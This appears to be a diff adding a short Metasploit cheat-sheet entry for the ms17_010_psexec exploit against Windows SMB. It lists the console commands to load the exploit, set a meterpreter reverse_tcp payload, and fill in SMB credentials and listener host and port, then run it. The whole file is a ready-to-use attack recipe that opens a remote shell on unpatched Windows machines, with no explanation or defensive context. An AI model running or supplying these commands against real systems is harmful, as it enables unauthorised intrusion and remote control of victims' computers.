@@ -1,0 +1,13 @@
+ms17_010_psexec
+----------
+use exploit/windows/smb/ms17_010_psexec
+set payload windows/x64/meterpreter/reverse_tcp
+#set payload windows/meterpreter/reverse_tcp
+SMBDomain <>
+SMBPass <>
+SMBUser <>
+set lhost <>
+set lport <>
+set DisablePayloadHandler True
+run
+++++++++++  
